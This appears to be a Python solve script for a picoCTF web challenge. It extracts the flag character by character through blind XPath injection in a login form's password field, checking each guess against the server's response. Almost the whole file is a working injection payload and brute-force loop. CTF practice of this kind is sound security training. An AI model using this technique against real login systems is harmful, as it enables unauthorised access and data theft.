import requests as r
from string import *
from tqdm import tqdm

# Credit: https://www.w3schools.com/xml/xpath_syntax.asp
# //* -> Select all elements in the document
# [starts-with(text(), '__')] -> Search any elements that start with __

link = "http://mercury.picoctf.net:7029/";

currPass = "picoCTF{";

characters = "}" + "_" + ascii_lowercase + ascii_uppercase + digits;

while(True):
        for i in tqdm(characters, desc = "\n Brutefocing"):
                data = {
                        "name":"admin",
                        "pass":"' or //*[starts-with(text(),'" + currPass + i + "')] or 'a'='b"
                        };
                result = r.post(url = link, data = data);
                if("You&#39;re on the right path" in result.text):
                        currPass = currPass+i;
                        break;
        print(currPass);
        if "}" in currPass:
                break;
print(currPass);
        
